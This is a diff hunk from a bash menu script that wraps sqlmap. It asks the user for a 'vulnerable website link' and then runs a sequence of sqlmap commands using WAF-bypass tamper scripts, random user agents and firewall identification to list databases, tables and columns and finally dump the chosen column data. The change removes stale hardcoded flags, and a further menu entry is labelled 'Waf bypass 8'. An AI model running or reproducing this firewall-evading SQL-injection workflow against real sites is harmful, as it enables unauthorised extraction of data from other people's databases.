@@ -120,16 +120,16 @@ do
             echo "Enter vulnerable website link :"
             read site
             cd sqlmap
-            python2 sqlmap.py -u "$site" --tables -D miss_db --is-dba --threads="10" --time-sec=10 --timeout=5 --no-cast --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent --dbs
+            python2 sqlmap.py -u "$site" --threads="10" --time-sec=10 --timeout=5 --no-cast --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent --dbs
             echo "Enter the name of the database you got from sqlmap"
             read db
-            python2 sqlmap.py -u "$site" --tables -D miss_db --is-dba --threads="10" --time-sec=10 --timeout=5 --no-cast --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent -D $db --tables
+            python2 sqlmap.py -u "$site" --threads="10" --time-sec=10 --timeout=5 --no-cast --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent -D $db --tables
             echo "enter the table to view its columns"
             read tb
-            python2 sqlmap.py -u "$site" --tables -D miss_db --is-dba --threads="10" --time-sec=10 --timeout=5 --no-cast --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent -D $db -T $tb --columns
+            python2 sqlmap.py -u "$site" --threads="10" --time-sec=10 --timeout=5 --no-cast --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent -D $db -T $tb --columns
             echo "Enter the column to dump data use , (comma) for multiple columns :"
             read col
-            python2 sqlmap.py -u "$site" --tables -D miss_db --is-dba --threads="10" --time-sec=10 --timeout=5 --no-cast --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent -D $db -T $tb -C $col --dump
+            python2 sqlmap.py -u "$site" --threads="10" --time-sec=10 --timeout=5 --no-cast --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent -D $db -T $tb -C $col --dump
             ;;
             "Waf bypass 8")
             echo "Enter vulnerable website link :"
